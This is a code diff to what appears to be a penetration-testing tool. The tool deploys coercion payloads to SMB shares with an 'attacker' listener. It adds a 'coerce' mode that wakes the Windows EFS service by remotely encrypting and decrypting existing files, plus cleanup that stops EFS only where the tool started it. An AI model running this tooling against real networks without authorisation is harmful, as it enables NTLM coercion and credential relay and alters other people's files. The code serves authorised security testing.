@@ -158,6 +158,17 @@ def handle_identify(args, credentials, log_queue):
     )
     filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
     write_list_to_file(filtered_targets, "payload_targets.txt")
+    if getattr(args, "json_output", False):
+        print(
+            json.dumps(
+                {
+                    "mode": "identify",
+                    "input_targets": len(targets),
+                    "payload_targets_count": len(filtered_targets),
+                    "payload_targets": filtered_targets,
+                }
+            )
+        )
 
 
 def handle_deploy(args, credentials):
@@ -208,9 +219,18 @@ def handle_deploy(args, credentials):
     encrypt_keep = getattr(args, "encrypt_keep", False)
     encrypt_target = getattr(args, "encrypt_target", "payload")
     probe_delete = getattr(args, "probe_delete", False)
-    encrypt_hosts = set()  # Hosts where we likely woke EFS
+    encrypt_hosts = set()  # Hosts that received an --encrypt payload
+    efs_was_stopped = set()  # Hosts where EFS was confirmed-Stopped pre-deploy
     for target in targets:
         target.connect(credentials)
+        # Snapshot EFS state BEFORE any encrypt work so cleanup --stop-efs
+        # only stops services we actually woke. Uses the SMB session that's
+        # already established for the deploy.
+        if encrypt and target.connection is not None:
+            from linksiren.target import _efs_service_is_running
+            initial = _efs_service_is_running(target.connection)
+            if initial is False:
+                efs_was_stopped.add(target.host)
         for path in target.paths:
             new_payload_path = target.write_payload(
                 path=path,
@@ -236,6 +256,113 @@ def handle_deploy(args, credentials):
         write_list_to_file(
             sorted(encrypt_hosts), "encrypt_triggered_hosts.txt", "w"
         )
+    # Second sidecar: hosts where EFS was *confirmed Stopped* before our
+    # deploy. cleanup --stop-efs only stops EFS on this strict subset so we
+    # never turn off a service that was legitimately running for non-engagement
+    # reasons.
+    if efs_was_stopped:
+        write_list_to_file(
+            sorted(efs_was_stopped), "efs_started_by_us.txt", "w"
+        )
+    if getattr(args, "json_output", False):
+        print(
+            json.dumps(
+                {
+                    "mode": "deploy",
+                    "payload": args.payload,
+                    "attacker": args.attacker,
+                    "payloads_attempted": sum(len(t.paths) for t in targets),
+                    "payloads_written": payloads_written,
+                    "encrypt_hosts": sorted(encrypt_hosts),
+                    "efs_started_by_us": sorted(efs_was_stopped),
+                }
+            )
+        )
+
+
+def handle_coerce(args, credentials):
+    """Trigger the EFS service on each target host without dropping payloads.
+
+    Reuses the existing-file-encryption trick: probe EFS state, wake it via
+    a brief throwaway encrypted-file if needed, EFSR-encrypt and decrypt the
+    smallest existing file in each target folder. Records hosts that were
+    initially-Stopped into ``efs_started_by_us.txt`` so a later
+    ``cleanup --stop-efs`` can revert them cleanly.
+    """
+    targets = read_targets(args.targets)
+    triggered_hosts = set()
+    efs_was_stopped = set()
+    logger = logging.getLogger("main_logger")
+
+    from linksiren.target import (
+        _efs_service_is_running,
+        _efsr_encrypt_remote,
+        _efsr_decrypt_remote,
+    )
+
+    for target in targets:
+        target.connect(credentials)
+        if target.connection is None:
+            continue
+        initial = _efs_service_is_running(target.connection)
+        if initial is False:
+            efs_was_stopped.add(target.host)
+        for path in target.paths:
+            share = path.split("\\")[0]
+            folder = "\\".join(path.split("\\")[1:])
+            smallest_rel = target._find_smallest_existing_file(share, folder)
+            if smallest_rel is None:
+                logger.warning(
+                    "coerce: no non-empty existing file in target folder; "
+                    "cannot place EFS trigger here.",
+                    extra={"path": f"\\\\{target.host}\\{share}\\{folder}"},
+                )
+                continue
+            smallest_unc = f"\\\\{target.host}\\{share}\\{smallest_rel}"
+            if initial is not True:
+                target._wake_efs_via_throwaway(share, folder)
+            try:
+                _efsr_encrypt_remote(target.connection, smallest_unc, logger=logger)
+                logger.info(
+                    "coerce: encrypted existing file to trigger EFS.",
+                    extra={"path": smallest_unc},
+                )
+                try:
+                    _efsr_decrypt_remote(
+                        target.connection, smallest_unc, logger=logger
+                    )
+                    logger.info(
+                        "coerce: reverted encryption on existing file.",
+                        extra={"path": smallest_unc},
+                    )
+                except Exception as e:
+                    logger.warning(
+                        "coerce: encryption succeeded but revert failed; "
+                        "existing file remains EFS-encrypted on disk.",
+                        extra={"path": smallest_unc, "exception": str(e)},
+                    )
+                triggered_hosts.add(target.host)
+            except Exception as e:
+                logger.warning(
+                    "coerce: EfsRpcEncryptFileSrv failed on the chosen "
+                    "existing file; EFS may not be reachable.",
+                    extra={"path": smallest_unc, "exception": str(e)},
+                )
+
+    if triggered_hosts:
+        write_list_to_file(
+            sorted(triggered_hosts), "encrypt_triggered_hosts.txt", "w"
+        )
+    if efs_was_stopped:
+        write_list_to_file(
+            sorted(efs_was_stopped), "efs_started_by_us.txt", "w"
+        )
+    print(
+        f"coerce: triggered EFS on {len(triggered_hosts)} host(s); "
+        f"{len(efs_was_stopped)} were initially Stopped (eligible for "
+        "cleanup --stop-efs revert).",
+        file=sys.stderr,
+    )
 
 
 def handle_cleanup(args, credentials):
@@ -255,11 +382,35 @@ def handle_cleanup(args, credentials):
     """
     payloads_not_deleted = []
     targets = read_targets(args.targets)
+    # Read the "EFS was stopped before deploy" sidecar — strict subset of
+    # hosts where --stop-efs is allowed to stop the service.
+    stop_efs = getattr(args, "stop_efs", False)
+    try:
+        with open("efs_started_by_us.txt", encoding="utf-8") as f:
+            efs_started_by_us = {line.strip() for line in f if line.strip()}
+    except FileNotFoundError:
+        efs_started_by_us = set()
+    stopped_hosts = []
+    refused_hosts = []
     for target in targets:
         target.connect(credentials)
         # Use ``extend`` so failures from earlier hosts aren't dropped on the
         # floor when iterating multiple targets.
         payloads_not_deleted.extend(target.delete_payloads())
+        # Stop EFS only if (a) pentester opted in, (b) we recorded this host
+        # as initially-stopped before our deploy, AND (c) EFS is currently
+        # running. The (c) check avoids spurious stop attempts and is the
+        # honest interpretation of "only stop what we started".
+        if stop_efs and target.host in efs_started_by_us:
+            from linksiren.target import (
+                _efs_service_is_running,
+                _efs_service_stop,
+            )
+            if _efs_service_is_running(target.connection) is True:
+                if _efs_service_stop(target.connection, logger=logging.getLogger("main_logger")):
+                    stopped_hosts.append(target.host)
+                else:
+                    refused_hosts.append(target.host)
 
     write_list_to_file(payloads_not_deleted, "payloads_not_deleted.txt", "w")
 
@@ -272,17 +423,50 @@ def handle_cleanup(args, credentials):
             triggered = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         triggered = []
-    if triggered:
+    main_log = logging.getLogger("main_logger")
+    if stop_efs:
+        if stopped_hosts:
+            msg = (
+                f"Stopped EFS service via SCMR on {len(stopped_hosts)} "
+                f"host(s): {', '.join(stopped_hosts)}. These hosts had EFS "
+                "Stopped before our deploy; the service was woken by our "
+                "--encrypt trigger and is now restored to the original state."
+            )
+            main_log.info(msg, extra={"path": None})
+            print(msg, file=sys.stderr)
+        if refused_hosts:
+            msg = (
+                f"--stop-efs requested but SCMR stop FAILED on "
+                f"{len(refused_hosts)} host(s): {', '.join(refused_hosts)}. "
+                "Common cause: the calling account lacks privilege to stop "
+                "services. EFS service is still RUNNING on these hosts."
+            )
+            main_log.warning(msg, extra={"path": None})
+            print(msg, file=sys.stderr)
+        # Hosts that had EFS already-running pre-deploy are deliberately
+        # left alone — they didn't change state because of us.
+        already_running = sorted(set(triggered) - efs_started_by_us)
+        if already_running:
+            msg = (
+                "--stop-efs left EFS untouched on "
+                f"{len(already_running)} host(s) that had EFS already "
+                "Running before deploy (not our state to revert): "
+                + ", ".join(already_running)
+            )
+            main_log.info(msg, extra={"path": None})
+            print(msg, file=sys.stderr)
+    elif triggered:
         msg = (
             "EFS service is likely still RUNNING on "
             f"{len(triggered)} host(s) that received an --encrypt payload "
             "during deploy: "
             + ", ".join(triggered)
             + ". Cleanup removed the file(s) but did not stop the service. "
-            "Verify with `Get-Service EFS` on each host; if stopping is "
-            "required for engagement cleanliness, do so out-of-band."
+            "Use cleanup --stop-efs to stop it automatically (only acts on "
+            "hosts where EFS was confirmed Stopped before deploy), or "
+            "verify with `Get-Service EFS` and stop out-of-band."
         )
-        logging.getLogger("main_logger").warning(msg, extra={"path": None})
+        main_log.warning(msg, extra={"path": None})
         print(msg, file=sys.stderr)
 
     if len(payloads_not_deleted) == 0:
